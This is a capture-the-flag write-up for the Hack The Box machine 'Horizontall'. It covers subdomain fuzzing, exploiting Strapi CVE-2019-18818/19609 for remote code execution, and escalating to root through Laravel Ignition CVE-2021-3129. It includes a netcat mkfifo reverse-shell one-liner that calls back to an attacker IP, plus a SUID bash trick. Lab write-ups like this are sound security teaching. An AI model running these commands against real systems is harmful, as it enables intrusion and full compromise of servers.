# Hack The Box: Horizontall

**Difficulty:** Easy
**OS:** Linux

Horizontall is an Easy-level Linux machine that highlights the risks of using outdated third-party frameworks and the importance of enumerating internal services. The initial foothold is achieved by discovering an instance of Strapi (a headless CMS) via subdomain fuzzing, which is vulnerable to unauthenticated remote code execution. Privilege escalation involves pivoting through the system and exploiting a locally running Laravel application vulnerable to a known deserialization flaw.

---

## Reconnaissance

We begin the assessment by scanning the target for open ports using `nmap`.

```bash
nmap -p- --min-rate 10000 10.10.11.105
nmap -p 22,80 -sCV 10.10.11.105
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (nginx 1.14.0)

Browsing to port 80 reveals a static landing page for a company named "Horizontall". Interacting with the page provides no immediate functionality, such as login portals or contact forms. The site heavily references the domain `horizontall.htb`. We add this to our `/etc/hosts` file.

```bash
echo "10.10.11.105 horizontall.htb" >> /etc/hosts
```

### Subdomain Enumeration

Given the static nature of the main site, we use `ffuf` to fuzz for active subdomains.

```bash
ffuf -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200
```

The enumeration reveals a subdomain: `api-prod.horizontall.htb`. We add this new subdomain to the `/etc/hosts` file and navigate to it.

## Web Exploitation

Accessing `api-prod.horizontall.htb` returns a generic welcome message. We run a directory brute-force against this new subdomain using `feroxbuster` or `gobuster`.

```bash
feroxbuster -u http://api-prod.horizontall.htb
```

The scan identifies an `/admin` endpoint. Accessing this endpoint loads the administrative login panel for Strapi, an open-source headless CMS.

### Exploiting Strapi (CVE-2019-18818 / CVE-2019-19609)

We need to identify the exact version of Strapi in use. By examining the JavaScript files loaded by the admin panel or looking for predictable installation files, we can extract the version number. Accessing `http://api-prod.horizontall.htb/admin/init` often reveals the version configuration.

The version is identified as `3.0.0-beta.17.4`. Researching this version reveals it is vulnerable to an unauthenticated Remote Code Execution (RCE) flaw. The vulnerability stems from insecure handling of password resets, allowing an attacker to reset the administrator password and subsequently upload a malicious plugin that executes code.

While manual exploitation is possible by forging the password reset requests, there are readily available exploit scripts for this specific CVE.

We download a Python exploit script and point it at the target.

```bash
python3 exploit.py http://api-prod.horizontall.htb
```

The exploit runs, resets the admin password, authenticates, and provides a pseudo-shell or mechanism to execute arbitrary commands. We use this access to execute a reverse shell payload.

```bash
# Executing via the exploit interface
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 9999 >/tmp/f
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

We establish persistence and retrieve the `user.txt` flag from the `strapi` user's home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as the `strapi` user, we review the active network connections to identify any services running exclusively on the localhost.

```bash
netstat -tulpn
```

The output reveals a service listening on `127.0.0.1:8000`. We use `curl` to interact with this internal service.

```bash
curl http://127.0.0.1:8000
```

The response indicates that a Laravel application is running on this port. We must determine the version of this Laravel application. Searching the file system for the Laravel application directory (e.g., `/opt/laravel` or `/var/www/html/laravel`) and examining the `composer.json` file reveals the framework version.

The application is running Laravel version 8.x.

### Exploiting Laravel (CVE-2021-3129)

Researching Laravel 8.x reveals a known vulnerability, CVE-2021-3129, an insecure deserialization flaw within the Facade Ignition component used for error tracking. If the application runs in debug mode (which is often the case in development or internal-facing tools), an attacker can exploit this to achieve RCE.

Since the service is only bound to `localhost`, we can exploit it directly from our SSH/reverse shell session, or set up a local port forward using Chisel or SSH tunneling.

```bash
# Using SSH tunneling if we added our public key to authorized_keys
ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105
```

We use a well-known exploit tool for CVE-2021-3129 (such as `laravel-ignition-rce`). The exploit requires generating a PHPGGC (PHP Generic Gadget Chains) deserialization payload. The exploit tool automates the process of forcing an error, injecting the payload via the log file, and triggering the deserialization.

```bash
python3 exploit.py http://127.0.0.1:8000 --command "chmod +s /bin/bash"
```

We execute the exploit, which leverages the deserialization vulnerability to set the SUID bit on the `/bin/bash` binary.

```bash
/bin/bash -p
# id
uid=0(root) gid=1001(strapi) euid=0(root) groups=1001(strapi)
```

The machine is fully compromised, and we retrieve the `root.txt` flag.
